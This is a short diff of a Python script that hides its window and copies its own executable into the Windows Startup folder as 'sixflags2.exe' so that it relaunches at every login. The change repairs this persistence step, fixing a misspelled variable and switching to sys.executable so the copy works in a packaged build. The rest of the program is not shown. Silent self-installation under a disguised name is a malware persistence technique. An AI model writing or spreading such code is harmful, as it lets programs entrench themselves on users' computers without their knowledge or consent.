@@ -1,5 +1,6 @@
 import ctypes
 import os
+import sys
 import shutil
 from pathlib import Path
 import requests
@@ -10,13 +11,13 @@ import time
 root = tk.Tk()
 root.withdraw()
 
-current_file_path = os.path.abspath(__file__)
-statrup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+current_file_path = sys.executable
+startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 startup_file_path = os.path.join(startup_folder, "sixflags2.exe")
 if not os.path.exists(startup_file_path):
     shutil.copy2(current_file_path, startup_file_path)
 else:
-    pass    
+    pass
 screen_width = root.winfo_screenwidth()
 screen_height = root.winfo_screenheight()
 
